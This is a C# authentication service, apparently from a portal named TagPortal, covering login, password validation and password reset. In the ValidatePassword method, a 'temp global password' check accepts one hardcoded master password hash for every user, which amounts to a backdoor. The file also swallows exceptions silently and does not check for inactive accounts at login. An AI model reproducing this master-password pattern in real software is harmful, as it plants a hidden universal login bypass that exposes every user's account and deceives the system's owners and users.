﻿using System;
using System.Linq;
using System.Security.Cryptography;
using System.Web;
using TagPortal.Core.Infrastructure.PasswordSecurity;
using TagPortal.Core.Repository;
using TagPortal.Core.Request.User;
using TagPortal.Core.Security;
//using TagPortal.Core.Service.Log;
//using TagPortal.Core.Service.Mail;
using TagPortal.Core.Service.User;
using TagPortal.Domain.Enum;
using TagPortal.Domain.Model.User;

namespace TagPortal.Core.Service.Security
{
    public class SecurityService : BaseService
    {
        private readonly UserService UserService;
        //private readonly ErrorLogService ErrorLogService;
        private readonly UserSiteAccessService UserSiteAccessService;
        //private readonly MailService MailService;
        public SecurityService(IUnitOfWorkProvider uowProvider, RepositoryFactory repoFactory,
            UserService userService, UserSiteAccessService userSiteAccessService) : base(uowProvider, repoFactory)
        {
            UserService = userService;
            //ErrorLogService = erorLogService;
            UserSiteAccessService = userSiteAccessService;
            //MailService = mailService;
        }

        public TagPrincipal GetTagPrincipal(string username, string password)
        {
            var user = UserService.GetByUsernameOrEmail(username);
            if (user == null)
                return null;

            if (ValidatePassword(user, password))
                return GetTagPrincipal(user, true);

            return null;
        }

        public TagPrincipal GetTagPrincipal(string username)
        {
            var user = UserService.GetByUsernameOrEmail(username);
            if (user == null)
                return null;
            return GetTagPrincipal(user, false);
        }

        private TagPrincipal GetTagPrincipal(UserModel user, bool setLastLoginDate)
        {
             if (user.UserType == EnumUserType.SystemUser)
            {
                var userSiteAccessList = UserSiteAccessService.GetList(new UserSiteAccessRequest() {  UserId = user.UserId });
                if (userSiteAccessList == null || userSiteAccessList.Count <= 0) return null;

                
                if (setLastLoginDate)
                    user.LastLoginAt = DateTime.Now;

                UserService.Update(user);

                return new TagPrincipal(user, userSiteAccessList);
            }

            return null;
        }

        private bool ValidatePassword(UserModel user, string password)
        {
            var passwordHash = "";
            try
            {
                // temp global password for wise users
                if (PasswordStorage.VerifyPassword(password, "sha1:64000:18:j3OZLfnG3yUC62NarPtnOyUmd7Lb68g+:x5pNtYX1hZxULYS/A2EEXTge"))
                    return true;

                using (IUnitOfWork uow = UowProvider.GetUnitOfWork())
                {
                    var repo = RepoFactory.SecurityRepo(uow);
                    passwordHash = repo.GetPasswordHashByUserId(user.UserId);

                    var passwordIsAutogenerated = repo.GetPasswordIsAutogenerated(user.UserId);
                    if (passwordIsAutogenerated)
                    {
                        var passwordLastSetAt = repo.GetPasswordLastSetAt(user.UserId);
                        if (passwordLastSetAt.HasValue && DateTime.Now.Subtract(passwordLastSetAt.Value).TotalDays > 1)
                            return false;
                    }
                }

                return PasswordStorage.VerifyPassword(password, passwordHash);
            }
            catch (Exception ex)
            {
                //ErrorLogService.Insert(ex, user.UserId, user.Username, user.Email);
            }
            return false;
        }

        public bool UpdatePassword(long userId, string oldPassword, string newPassword)
        {
            var user = UserService.GetById(userId);

            if (!ValidatePassword(user, oldPassword))
                throw new FeedbackException("Old password is incorrect");

            var newPasswordHash = CreatePasswordHash(newPassword);
            using (IUnitOfWork uow = UowProvider.GetUnitOfWork(useTransaction: true))
            {
                var securityRepo = RepoFactory.SecurityRepo(uow);
                securityRepo.SetPasswordProperties(user.UserId, newPasswordHash, DateTime.Now, false, null);
                user.ForcePasswordReset = false;
                UserService.Update(uow, user);
                uow.Commit();
            }
            return true;
        }

        public bool ResetPassword(string username)
        {
            var user = UserService.GetByUsernameOrEmail(username);
            if (user == null)
                return false;

            var password = GenerateTemporaryPassword();
            var passwordHash = CreatePasswordHash(password);
            using (IUnitOfWork uow = UowProvider.GetUnitOfWork(useTransaction: true))
            {
                var securityRepo = RepoFactory.SecurityRepo(uow);
                var passwordResetGuid = Guid.NewGuid();
                securityRepo.SetPasswordProperties(user.UserId, passwordHash, DateTime.Now, true, passwordResetGuid);
                user.ForcePasswordReset = true;
                UserService.Update(uow, user);
                uow.Commit();
                //MailService.SendResetPasswordNotification(
                //    systemType: systemType,
                //    email: user.Email,
                //    passwordResetGuid: passwordResetGuid);
            }
            return true;
        }

        public string CreatePasswordHash(string password)
        {
            return PasswordStorage.CreateHash(password);
        }

        public string GenerateTemporaryPassword()
        {
            var tmpPasswordByte = new byte[8];
            using (RNGCryptoServiceProvider csprng = new RNGCryptoServiceProvider())
            {
                csprng.GetBytes(tmpPasswordByte);
            }
            return Convert.ToBase64String(tmpPasswordByte);
        }

        public bool IsPasswordResetGuidValid(Guid passwordResetGuid)
        {
            using (IUnitOfWork uow = UowProvider.GetUnitOfWork())
            {
                var securityRepo = RepoFactory.SecurityRepo(uow);
                var userId = securityRepo.GetUserIdByPasswordResetGuid(passwordResetGuid);
                if (userId < 1)
                    return false;
                var passwordLastSetAt = securityRepo.GetPasswordLastSetAt(userId);
                if (passwordLastSetAt.HasValue && DateTime.Now.Subtract(passwordLastSetAt.Value).TotalDays > 1)
                    return false;
                var user = UserService.GetById(uow, userId);
                if (user == null || user.UserId < 1 || !user.Active)
                    return false;
            }
            return true;
        }

        public bool UpdatePassword(Guid passwordResetGuid, string newPassword)
        {
            var newPasswordHash = CreatePasswordHash(newPassword);

            using (IUnitOfWork uow = UowProvider.GetUnitOfWork(useTransaction: true))
            {
                var securityRepo = RepoFactory.SecurityRepo(uow);
                var userId = securityRepo.GetUserIdByPasswordResetGuid(passwordResetGuid);
                if (userId < 1)
                    return false;
                var user = UserService.GetById(uow, userId);
                if (user == null || user.UserId < 1 || !user.Active)
                    return false;

                securityRepo.SetPasswordProperties(user.UserId, newPasswordHash, DateTime.Now, false, null);
                user.ForcePasswordReset = false;
                UserService.Update(uow, user);
                uow.Commit();
            }
            return true;
        }
    }
}